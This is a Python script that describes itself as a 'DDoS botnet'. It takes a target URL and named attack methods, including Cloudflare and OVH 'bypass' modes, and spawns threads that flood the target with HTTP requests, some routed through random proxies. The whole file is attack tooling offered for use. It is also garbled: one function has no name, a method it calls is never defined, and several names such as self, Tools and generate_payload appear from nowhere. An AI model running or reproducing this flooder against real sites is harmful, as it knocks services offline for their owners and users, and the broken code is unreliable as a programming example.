import threading
import requests
from contextlib import suppress
from requests.sessions import Session
from random import choice as randchoice
from time import sleep, time
from subprocess import run, PIPE
import socket
import argparse

REQUESTS_SENT = 0
BYTES_SEND = 0



def send_request(url, method, data=None):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        'User-Agent' 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36'
    }
    if method == 'GET':
        return requests.get(url, headers=headers)
    elif method == 'POST':
        return requests.post(url, data=data, headers=headers)
    elif method == 'HEAD':
        return requests.head(url, headers=headers)
    elif method == 'HTTP-SYN':
        return requests.request('SYN', url, headers=headers)
    elif method == 'HTTP-SYN-TPC':
        return requests.request('SYN-TPC', url, headers=headers)
    elif method == 'OVH BOT':
        return requests.get(url, headers=headers)
    elif method == 'GSB':
        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (method,
                                                           url.raw_path_qs,
                                                           ProxyTools.Random.rand_str(6)) +
                             "Host: %s\r\n" % url.authority +
                             randHeadercontent +
                             'Accept-Encoding: gzip, deflate, br\r\n'
                             'Accept-Language: en-US,en;q=0.9\r\n'
                             'Cache-Control: max-age=0\r\n'
                             'Connection: Keep-Alive\r\n'
                             'Sec-Fetch-Dest: document\r\n'
                             'Sec-Fetch-Mode: navigate\r\n'
                             'Sec-Fetch-Site: none\r\n'
                             'Sec-Fetch-User: ?1\r\n'
                             'Sec-Gpc: 1\r\n'
                             'Pragma: no-cache\r\n'
                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
        s = None
        with suppress(Exception), open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)
    else:
        return None

def worker(url):
    while True:
        try:
            response = send_request(url, 'OVH BOT')
            print(response.status_code)
        except requests.exceptions.RequestException as e:
            print(e)

def ovh_bypass(url, proxies=None):
    global REQUESTS_SENT, BYTES_SEND
    pro = None
    if proxies:
        pro = randchoice(proxies)
    s = None
    with suppress(Exception), Session() as s:
        for _ in range(5):
            if pro:
                with s.get(url, proxies=pro.asRequest()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)
                    continue

            with s.get(url) as res:
                REQUESTS_SENT += 1
                BYTES_SEND += len(res.content)

def DGB(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                with ss.get(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)

def (url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                payload = generate_payload()
                with ss.open(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)

def CFBUAM(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            payload = generate_payload()
            with ss.open(url) as res:
                REQUESTS_SENT += 1
                BYTES_SEND += len(res.content)
            sleep(5.01)
            ts = time()
            while time() < ts + 120:
                with ss.open(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)
                sleep(1)

def BYPASS(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                pro = None
                if self._proxies:
                    pro = randchoice(self._proxies)
                if pro:
                    with ss.get(url, proxies=pro.asRequest()) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                else:
                    with ss.get(url) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)

def CFB():
    global REQUESTS_SENT, BYTES_SEND
    pro = None
    if self._proxies:
        pro = randchoice(self._proxies)
    s = None
    with suppress(Exception), create_scraper() as s:
        for _ in range(self._rpc * 10000):
            if pro:
                with s.get(self._target.human_repr(),
                           proxies=pro.asRequest()) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
                    continue

        with s.get(self._target.human_repr()) as res:
            REQUESTS_SENT += 1
            BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

def uambypass(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
                }
                with ss.get(url, headers=headers) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)

def beta_test(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                # Perform custom requests or tests here
                # Example:
                with ss.get(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)

def BOTNET_V1(url):
    global REQUESTS_SENT, BYTES_SEND
    with suppress(Exception):
        with Session() as ss:
            for _ in range(5):
                # Perform custom requests or tests here
                # Example:
                with ss.get(url) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(res.content)

                    

def run_threads(url, num_threads, methods):
    threads = []
    for _ in range(num_threads):
        for method in methods:
            if method == 'OVH BOT':
                t = threading.Thread(target=ovh_bypass, args=(url,))
            elif method == 'DGB':
                t = threading.Thread(target=DGB, args=(url,))
            elif method == 'AVB':
                t = threading.Thread(target=AVB, args=(url,))
            elif method == 'CFBUAM':
                t = threading.Thread(target=CFBUAM, args=(url,))
            elif method == 'BYPASS':
                t = threading.Thread(target=BYPASS, args=(url,))
            elif method == 'CFB':
                t = threading.Thread(target=CFB)
            elif method == 'UAM Bypass':
                t = threading.Thread(target=uambypass, args=(url,))
            elif method == 'Beta Test':
                t = threading.Thread(target=beta_test, args=(url,))
            elif method == 'BOTNET_V1':
                t = threading.Thread(target=BOTNET_V1, args=(url,))
            threads.append(t)
            t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DDoS botnet')
    parser.add_argument('url', type=str, help='The target URL')
    parser.add_argument('num_threads', type=int, help='Number of threads to use')
    parser.add_argument('methods', type=str, nargs='+', help='Attack methods to use')

    args = parser.parse_args()
    url = args.url
    num_threads = args.num_threads
    methods = args.methods

    run_threads(url, num_threads, methods)
